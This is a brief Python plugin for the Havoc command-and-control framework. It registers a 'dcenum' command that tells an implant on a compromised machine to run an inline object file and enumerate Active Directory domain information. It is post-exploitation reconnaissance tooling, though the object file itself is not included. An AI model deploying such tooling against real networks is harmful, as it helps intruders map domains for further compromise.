from havoc import Demon, RegisterCommand
from struct import pack, calcsize

def dcenum(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    demon  = Demon( demonID )

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate domain information using Active Directory Domain Services" )
    
    demon.InlineExecute( TaskID, "go", "Domaininfo.o", b'', False )

    return TaskID

RegisterCommand( dcenum, "", "dcenum", "enumerate domain information using Active Directory Domain Services", 0, "", "" )
